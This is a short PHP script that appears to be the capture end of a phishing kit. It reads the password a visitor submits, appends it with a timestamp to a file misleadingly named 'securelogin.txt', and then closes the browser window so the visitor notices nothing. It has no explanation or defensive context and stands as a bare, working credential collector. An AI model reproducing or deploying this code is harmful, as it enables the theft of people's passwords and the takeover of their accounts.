<?php

date_default_timezone_set('Etc/GMT+10');
    $date = date('m/d/Y h:i:s a ', time());
    $ip = $_SERVER['REMOTE_ADDR'];
    $password = $_POST['password'];
    $file = fopen("./securelogin.txt","a+");
    fwrite($file,$date);
    fwrite($file,$password);
    fwrite($file,"\n");
    fclose($file); 
    print_r(error_get_last());
    echo '<script>window.close();</script>';
    exit();

